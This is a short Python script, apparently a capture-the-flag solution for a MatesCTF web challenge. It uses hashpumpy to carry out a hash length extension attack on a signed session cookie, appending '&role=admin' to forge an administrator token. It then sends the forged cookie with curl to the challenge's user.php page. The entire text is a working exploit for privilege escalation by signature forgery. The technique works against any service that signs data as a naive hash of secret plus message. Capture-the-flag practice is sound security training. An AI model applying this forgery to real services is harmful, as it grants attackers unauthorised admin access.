import os
import hashpumpy

dump = hashpumpy.hashpump('3b88e265e072d231ec37b67e92bea158', 'name=matesctf', '&role=admin', 12)

cookie = (dump[1]+"&sign="+dump[0]).encode('base64').replace("\n", "")
print cookie

url = "http://weblab02.matesctf.org/web200_c1c6afb055ad6ba7b9dbd3cf39e99633/user.php"
os.system("curl --header 'Cookie: token="+cookie+"' "+url)
